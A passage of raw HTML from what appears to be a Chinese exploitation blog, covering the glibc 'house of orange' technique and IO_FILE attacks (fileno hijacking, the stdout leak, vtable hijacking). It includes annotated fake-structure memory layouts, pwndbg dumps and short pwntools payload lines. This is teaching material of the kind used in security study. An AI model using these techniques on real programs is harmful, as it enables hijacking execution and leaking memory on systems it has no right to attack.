进行unsortedbin遍历时，将会进入进入smallbin-0x60 */</span></span><br><span class="line">    <span class="comment">/* 将会被当做是IO_FILE 结构体 */</span></span><br><span class="line"><span class="number">0x55e7fa48d520</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00007fd8c195c510</span> <span class="comment">// unsortedbin attack</span></span><br><span class="line">    <span class="comment">/* 向_IO_list_all中写入main_arean+88 */</span></span><br><span class="line">    <span class="comment">/* 如果把main_arean+88当成一个IO_FILE结构体 */</span></span><br><span class="line">    <span class="comment">/* 那么struct _IO_FILE *_chain指针的地址为main_arena+0xc0(88+0x68) */</span></span><br><span class="line">    <span class="comment">/* 而main_arena+0xc0中装有smallbin-0x60的地址 */</span></span><br><span class="line">    <span class="comment">/* 在smallbin-0x60中伪造数据,就是在伪造IO_FILE结构体 */</span></span><br><span class="line"><span class="number">0x55e7fa48d530</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000001</span> </span><br><span class="line">    <span class="comment">/* _IO_write_base and _IO_write_ptr */</span></span><br><span class="line"><span class="number">0x55e7fa48d540</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55e7fa48d550</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55e7fa48d560</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55e7fa48d570</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55e7fa48d580</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55e7fa48d590</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55e7fa48d5a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55e7fa48d5b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55e7fa48d5c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55e7fa48d5d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">    <span class="comment">/* __pad5 and _mode(修改_mode为“0”非常方便) */</span></span><br><span class="line"><span class="number">0x55e7fa48d5e0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x000055e7fa48d5e8</span> <span class="comment">// vtable_start</span></span><br><span class="line">    <span class="comment">/* fake_vtable(IO_2_1_stdin+216) */</span></span><br><span class="line"><span class="number">0x55e7fa48d5f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55e7fa48d600</span>:	<span class="number">0x00007fd8c15dd380</span>	<span class="number">0x0000000000000000</span> <span class="comment">// system(vtable+32)</span></span><br><span class="line">    <span class="comment">/* vtable+32就是__overflow,劫持overflow为system(整个结构体作为overflow的参数) */</span></span><br><span class="line"><span class="number">0x55e7fa48d610</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55e7fa48d620</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55e7fa48d630</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<p>现在简单解释一下程序为什么会调用 overflow：（这是FSOP的内容）</p>
<p>因为我们修改了 unsortedbin 的结构，使其不合法了，导致程序触发异常并执行“malloc_printerr”，从而调用了 <code>_IO_flush_all_lockp</code> ，最后调用 <code>_IO_OVERFLOW</code>（虚表调用，但虚表已被伪造）</p>
<p><strong>house of orange 小结（2.23-64位）</strong></p>
<p>house of orange 真的是特别精妙的漏洞利用，这里简述一下它的过程</p>
<ul>
<li>利用堆溢出修改 top chunk-&gt;size 为“0xf81”</li>
<li>申请一个较大的 chunk，把 top chunk 放入unsortedbin</li>
<li>申请“0x400”进行泄露</li>
<li>再次溢出，修改 unsorted chunk-&gt;size 为“0x60”，在遍历 unsortedbin 之时可以被放入 smallbin</li>
<li>利用 unsortedbin attack 向 IO_list_all 中写入 main_arena+88（被当成一个IO_FILE结构体）</li>
<li>在大小为“0x60”的 smallbin 中伪造IO_FILE结构体，劫持虚表到可控区域</li>
<li>在 <code>_IO_OVERFLOW</code> 的位置写入“system”</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/16/IO_FILE%20pwn/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/16/IO_FILE%20pwn/" class="post-title-link" itemprop="url">IO_FILE pwn</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-03-16 18:44:44" itemprop="dateCreated datePublished" datetime="2022-03-16T18:44:44+08:00">2022-03-16</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-12-09 18:35:30" itemprop="dateModified" datetime="2022-12-09T18:35:30+08:00">2022-12-09</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Technology/" itemprop="url" rel="index"><span itemprop="name">Technology</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>8.8k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>8 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="IO-FILE-pwn"><a href="#IO-FILE-pwn" class="headerlink" title="IO_FILE pwn"></a>IO_FILE pwn</h2><p>FILE 在 Linux 系统的标准 IO 库中是用于描述文件的结构，称为文件流</p>
<p>FILE 结构在程序执行 fopen 等函数时会进行创建，并分配在堆中，然后以链表的形式串联起来，但系统一开始会自动创建的三个文件即 stdin、stdout、stderr，它们是在libc上</p>
<p>先借 libc-2.23 说明一下 FILE 结构：</p>
<p>在 libc-2.23 版本中，有个全局变量<code>_IO_list_all</code>，该变量指向了FILE链表的头部 </p>
<p>首先认识一个结构体<code>_IO_FILE_plus</code>，所有 FILE 文件结构都是这样的一个结构体，整个结构体如下代码所示，其中又包括了两个重要的结构体<code>_IO_FILE</code>和<code>IO_jump_t</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    _IO_FILE    file;</span><br><span class="line">    _IO_jump_t   *vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在 GDB 中输入以下命令可以打印 <code>_IO_list_all</code> ：（这里通过在前面加上结构体类型可以详细的打印其内存数据信息）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x*(struct _IO_FILE_plus*)_IO_list_all</span><br><span class="line">$<span class="number">1</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">0xfbad2086</span>,</span><br><span class="line">    _IO_read_ptr = <span class="number">0x0</span>,</span><br><span class="line">    _IO_read_end = <span class="number">0x0</span>,</span><br><span class="line">    _IO_read_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_write_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_write_ptr = <span class="number">0x0</span>,</span><br><span class="line">    _IO_write_end = <span class="number">0x0</span>,</span><br><span class="line">    _IO_buf_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_buf_end = <span class="number">0x0</span>,</span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_backup_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_save_end = <span class="number">0x0</span>,</span><br><span class="line">    _markers = <span class="number">0x0</span>,</span><br><span class="line">    _chain = <span class="number">0x7ffff7dd2620</span>, <span class="comment">// 指向下一个链表节点(stderr的下一个:stdout)</span></span><br><span class="line">    _fileno = <span class="number">0x2</span>, <span class="comment">// fileno值为2(标准错误流的文件描述符就是&#x27;2&#x27;)</span></span><br><span class="line">    _flags2 = <span class="number">0x0</span>,</span><br><span class="line">    _old_offset = <span class="number">0xffffffffffffffff</span>,</span><br><span class="line">    _cur_column = <span class="number">0x0</span>,</span><br><span class="line">    _vtable_offset = <span class="number">0x0</span>,</span><br><span class="line">    _shortbuf = &#123;<span class="number">0x0</span>&#125;,</span><br><span class="line">    _lock = <span class="number">0x7ffff7dd3770</span>,</span><br><span class="line">    _offset = <span class="number">0xffffffffffffffff</span>,</span><br><span class="line">    _codecvt = <span class="number">0x0</span>,</span><br><span class="line">    _wide_data = <span class="number">0x7ffff7dd1660</span>,</span><br><span class="line">    _freeres_list = <span class="number">0x0</span>,</span><br><span class="line">    _freeres_buf = <span class="number">0x0</span>,</span><br><span class="line">    __pad5 = <span class="number">0x0</span>,</span><br><span class="line">    _mode = <span class="number">0x0</span>,</span><br><span class="line">    _unused2 = &#123;<span class="number">0x0</span> &lt;repeats <span class="number">20</span> times&gt;&#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = <span class="number">0x7ffff7dd06e0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这就是 <code>_IO_list_all</code> 变量， <strong>其指向 FILE 链表的头部</strong> ，结合上面的结构体可知，file对应的就是 <code>_IO_FILE</code> 结构类型，vtable 对应的就是 <code>_IO_jump_t</code> 类型 </p>
<p>在没有创建其它文件结构时， <code>_IO_list_all</code> 指向stderr，然后依次是 stdout 和 stdin（可以通过打印 <code>_chain</code> 进行查看）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x _IO_list_all</span><br><span class="line">$<span class="number">2</span> = <span class="number">0x7ffff7dd2540</span></span><br><span class="line">pwndbg&gt; p/x <span class="built_in">stderr</span></span><br><span class="line">$<span class="number">3</span> = <span class="number">0x7ffff7dd2540</span></span><br><span class="line">    </span><br><span class="line">pwndbg&gt; p/x _IO_list_all.file._chain</span><br><span class="line">$<span class="number">4</span> = <span class="number">0x7ffff7dd2620</span></span><br><span class="line">pwndbg&gt; p/x <span class="built_in">stdout</span></span><br><span class="line">$<span class="number">5</span> = <span class="number">0x7ffff7dd2620</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffff7dd2520</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffff7dd2520</span> (_IO_list_all) —▸ <span class="number">0x7ffff7dd2540</span> (_IO_2_1_stderr_) ◂— <span class="number">0xfbad2086</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x7ffff7dd2540</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffff7dd2540</span> (_IO_2_1_stderr_) ◂— <span class="number">0xfbad2086</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7ffff7dd2548</span> (_IO_2_1_stderr_+<span class="number">8</span>) ◂— <span class="number">0x0</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x7ffff7dd2620</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffff7dd2620</span> (_IO_2_1_stdout_) ◂— <span class="number">0xfbad2084</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7ffff7dd2628</span> (_IO_2_1_stdout_+<span class="number">8</span>) ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>由于 <code>_IO_FILE_plus</code> 中只是存储了 vtable 的指针，并没有存储详细的结构信息，所以这里我们进一步打印一下 vtable ：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p*(struct _IO_jump_t*)_IO_list_all.vtable </span><br><span class="line">$<span class="number">6</span> = &#123;</span><br><span class="line">  __dummy = <span class="number">0</span>,</span><br><span class="line">  __dummy2 = <span class="number">0</span>,</span><br><span class="line">  __finish = <span class="number">0x7ffff7a869d0</span> &lt;_IO_new_file_finish&gt;,</span><br><span class="line">  __overflow = <span class="number">0x7ffff7a87740</span> &lt;_IO_new_file_overflow&gt;,</span><br><span class="line">  __underflow = <span class="number">0x7ffff7a874b0</span> &lt;_IO_new_file_underflow&gt;,</span><br><span class="line">  __uflow = <span class="number">0x7ffff7a88610</span> &lt;__GI__IO_default_uflow&gt;,</span><br><span class="line">  __pbackfail = <span class="number">0x7ffff7a89990</span> &lt;__GI__IO_default_pbackfail&gt;,</span><br><span class="line">  __xsputn = <span class="number">0x7ffff7a861f0</span> &lt;_IO_new_file_xsputn&gt;,</span><br><span class="line">  __xsgetn = <span class="number">0x7ffff7a85ed0</span> &lt;__GI__IO_file_xsgetn&gt;,</span><br><span class="line">  __seekoff = <span class="number">0x7ffff7a854d0</span> &lt;_IO_new_file_seekoff&gt;,</span><br><span class="line">  __seekpos = <span class="number">0x7ffff7a88a10</span> &lt;_IO_default_seekpos&gt;,</span><br><span class="line">  __setbuf = <span class="number">0x7ffff7a85440</span> &lt;_IO_new_file_setbuf&gt;,</span><br><span class="line">  __sync = <span class="number">0x7ffff7a85380</span> &lt;_IO_new_file_sync&gt;,</span><br><span class="line">  __doallocate = <span class="number">0x7ffff7a7a190</span> &lt;__GI__IO_file_doallocate&gt;,</span><br><span class="line">  __read = <span class="number">0x7ffff7a861b0</span> &lt;__GI__IO_file_read&gt;,</span><br><span class="line">  __write = <span class="number">0x7ffff7a85b80</span> &lt;_IO_new_file_write&gt;,</span><br><span class="line">  __seek = <span class="number">0x7ffff7a85980</span> &lt;__GI__IO_file_seek&gt;,</span><br><span class="line">  __close = <span class="number">0x7ffff7a85350</span> &lt;__GI__IO_file_close&gt;,</span><br><span class="line">  __stat = <span class="number">0x7ffff7a85b70</span> &lt;__GI__IO_file_stat&gt;,</span><br><span class="line">  __showmanyc = <span class="number">0x7ffff7a89b00</span> &lt;_IO_default_showmanyc&gt;,</span><br><span class="line">  __imbue = <span class="number">0x7ffff7a89b10</span> &lt;_IO_default_imbue&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="fileno-劫持"><a href="#fileno-劫持" class="headerlink" title="fileno 劫持"></a>fileno 劫持</h2><p>这个利用比较局限，一般在有“open”的程序中使用</p>
<p>利用的原理很简单，通过上面的分析，我们可以看到 fileno 的值就是文件描述符，位于 stdin 文件结构开头0x70偏移处，在漏洞利用中可以通过 <strong>修改 stdin 的 fileno 值来重定位需要读取的文件</strong> （原本是“0”，从标准输入中读取，现在改为“fd”，从目标文件中读取），接下来类似于 read 之类的函数都会从目标文件中进行读取（修改为“flag”的描述符，就可以读取“flag”）</p>
<h2 id="IO-2-1-stdout-leak"><a href="#IO-2-1-stdout-leak" class="headerlink" title="IO_2_1_stdout leak"></a>IO_2_1_stdout leak</h2><p>可以在没有打印模块的情况下 leak libc_base，通常与 house of roman 结合</p>
<p>这个攻击需要用到结构体 <code>_IO_FILE</code> ：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;           </span><br><span class="line"><span class="comment">/* 文件标志，简单的说：像puts一类的输入输出函数要想正确的打印信息就需要正确设置该字段 */</span> </span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;    <span class="comment">/* 始终指向缓冲区中已被用户读走的字符的下一个 */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;    <span class="comment">/* 指向&quot;读缓冲区&quot;的末尾 */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;    <span class="comment">/* 指向&quot;读缓冲区&quot; */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base;    <span class="comment">/* 指向&quot;写缓冲区&quot; */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;    <span class="comment">/* 始终指向缓冲区中已被用户写入的字符的下一个 */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;    <span class="comment">/* 指向&quot;写缓冲区&quot;的末尾*/</span></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们一般将堆块分配到 stdout 指针处存储的 <code>_IO_2_1_stdout_</code> 处：（这里是一个 <code>IO_FILE</code> 结构体）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p <span class="built_in">stdout</span> </span><br><span class="line">$<span class="number">1</span> = (struct _IO_FILE *) <span class="number">0x7ffff7dd0760</span> &lt;_IO_2_1_stdout_&gt;</span><br><span class="line">pwndbg&gt; ptype <span class="built_in">stdout</span></span><br><span class="line">type = struct _IO_FILE &#123;</span><br><span class="line">    <span class="keyword">int</span> _flags;</span><br><span class="line">    <span class="keyword">char</span> *_IO_read_ptr;</span><br><span class="line">    <span class="keyword">char</span> *_IO_read_end;</span><br><span class="line">    <span class="keyword">char</span> *_IO_read_base;</span><br><span class="line">    <span class="keyword">char</span> *_IO_write_base;  <span class="comment">//  本质上是通过修改这个结构题泄露</span></span><br><span class="line">    <span class="keyword">char</span> *_IO_write_ptr;   <span class="comment">//  这两个指针地址之间的内容</span></span><br><span class="line">    <span class="keyword">char</span> *_IO_write_end;</span><br><span class="line">    <span class="keyword">char</span> *_IO_buf_base;</span><br><span class="line">    <span class="keyword">char</span> *_IO_buf_end;</span><br><span class="line">    <span class="keyword">char</span> *_IO_save_base;</span><br><span class="line">    <span class="keyword">char</span> *_IO_backup_base;</span><br><span class="line">    <span class="keyword">char</span> *_IO_save_end;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line">    <span class="keyword">int</span> _fileno;</span><br><span class="line">    <span class="keyword">int</span> _flags2;</span><br><span class="line">    <span class="keyword">__off_t</span> _old_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">    <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">    <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line">    _IO_lock_t *_lock;</span><br><span class="line">    <span class="keyword">__off64_t</span> _offset;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">    <span class="keyword">void</span> *_freeres_buf;</span><br><span class="line">    <span class="keyword">size_t</span> __pad5;</span><br><span class="line">    <span class="keyword">int</span> _mode;</span><br><span class="line">    <span class="keyword">char</span> _unused2[<span class="number">20</span>];</span><br><span class="line">&#125; *</span><br></pre></td></tr></table></figure>
<p>修改其 <code>_flags</code> 为 “0xfbad1800”（或者“0xfbad3887”），将后面三个read指针置空，将 <code>_IO_write_base</code> 处的第一个字节改为0x58（或者“0”），后面的 <code>_IO_write_ptr</code> 和 <code>_IO_write_end</code> 保持不变（该flags这样设置只是针对puts函数，其余打印函数略有不同）</p>
<p>当程序遇到puts函数时就会打印 <code>_IO_write_base</code> 到 <code>_IO_write_ptr</code> 之间的内容</p>
<ul>
<li>泄露 <code>_IO_file_jumps</code> 的写法：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&quot;\x58&quot;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>泄露 <code>_IO_2_1_stdin_</code> 的写法：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0xfbad3887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p8(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<h2 id="vtable-劫持"><a href="#vtable-劫持" class="headerlink" title="vtable 劫持"></a>vtable 劫持</h2><p>如果程序开了 Full RELRO ，禁用了 hook ，并且没有法控制栈，这时就要考虑 vtable 劫持了</p>
<p>vtable是 <code>_IO_FILE_plus</code> 结构体里的一个字段，是一个函数表指针，里面存储着许多和 IO 相关的函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p*(struct _IO_jump_t*)_IO_list_all.vtable</span><br><span class="line">$<span class="number">1</span> = &#123;</span><br><span class="line">  __dummy = <span class="number">0</span>,</span><br><span class="line">  __dummy2 = <span class="number">0</span>,</span><br><span class="line">  __finish = <span class="number">0x7ffff7e68510</span> &lt;_IO_new_file_finish&gt;,</span><br><span class="line">  __overflow = <span class="number">0x7ffff7e69320</span> &lt;_IO_new_file_overflow&gt;,</span><br><span class="line">  __underflow = <span class="number">0x7ffff7e68fc0</span> &lt;_IO_new_file_underflow&gt;,</span><br><span class="line">  __uflow = <span class="number">0x7ffff7e6a4c0</span> &lt;__GI__IO_default_uflow&gt;,</span><br><span class="line">  __pbackfail = <span class="number">0x7ffff7e6bc90</span> &lt;__GI__IO_default_pbackfail&gt;,</span><br><span class="line">  __xsputn = <span class="number">0x7ffff7e67b20</span> &lt;_IO_new_file_xsputn&gt;,</span><br><span class="line">  __xsgetn = <span class="number">0x7ffff7e677a0</span> &lt;__GI__IO_file_xsgetn&gt;,</span><br><span class="line">  __seekoff = <span class="number">0x7ffff7e66d90</span> &lt;_IO_new_file_seekoff&gt;,</span><br><span class="line">  __seekpos = <span class="number">0x7ffff7e6ac30</span> &lt;_IO_default_seekpos&gt;,</span><br><span class="line">  __setbuf = <span class="number">0x7ffff7e66a60</span> &lt;_IO_new_file_setbuf&gt;,</span><br><span class="line">  __sync = <span class="number">0x7ffff7e668f0</span> &lt;_IO_new_file_sync&gt;,</span><br><span class="line">  __doallocate = <span class="number">0x7ffff7e5a600</span> &lt;__GI__IO_file_doallocate&gt;,</span><br><span class="line">  __read = <span class="number">0x7ffff7e67e50</span> &lt;__GI__IO_file_read&gt;,</span><br><span class="line">  __write = <span class="number">0x7ffff7e67390</span> &lt;_IO_new_file_write&gt;,</span><br><span class="line">  __seek = <span class="number">0x7ffff7e66b30</span> &lt;__GI__IO_file_seek&gt;,</span><br><span class="line">  __close = <span class="number">0x7ffff7e66a50</span> &lt;__GI__IO_file_close&gt;,</span><br><span class="line">  __stat = <span class="number">0x7ffff7e67370</span> &lt;__GI__IO_file_stat&gt;,</span><br><span class="line">  __showmanyc = <span class="number">0x7ffff7e6be20</span> &lt;_IO_default_showmanyc&gt;,</span><br><span class="line">  __imbue = <span class="number">0x7ffff7e6be30</span> &lt;_IO_default_imbue&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数表中有19个函数，分别完成IO相关的功能，由IO函数调用，如 <code>fwrite</code> 最终会调用 <code>__write</code> 函数、 <code>fread</code> 会调用 <code>__doallocate</code> 来分配IO缓冲区等</p>
<p>vtable劫持的原理是：如果能够控制 FILE 结构体（一般是控制“stdin”的 <code>_IO_FILE_plus</code> 结构体），实现对 vtable 指针的修改，使得 vtable 指向可控的内存（一般在这片内存的各个区域中，全部写入“one_gadget”），在该内存中构造好 vtable，再通过调用相应IO函数，触发 vtable 函数的调用，即可劫持程序执行流（劫持最关键的点在于修改 <code>_IO_FILE_plus</code> 结构体的 vtable 指针）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7f754337997d</span>+<span class="number">3</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7f7543379980</span> (_IO_2_1_stdin_+<span class="number">160</span>) —▸ <span class="number">0x7f75433799c0</span> (_IO_wide_data_0) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7f7543379988</span> (_IO_2_1_stdin_+<span class="number">168</span>) ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">2</span> skipped</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7f75433799a0</span> (_IO_2_1_stdin_+<span class="number">192</span>) ◂— <span class="number">0xffffffff</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x7f75433799a8</span> (_IO_2_1_stdin_+<span class="number">200</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span 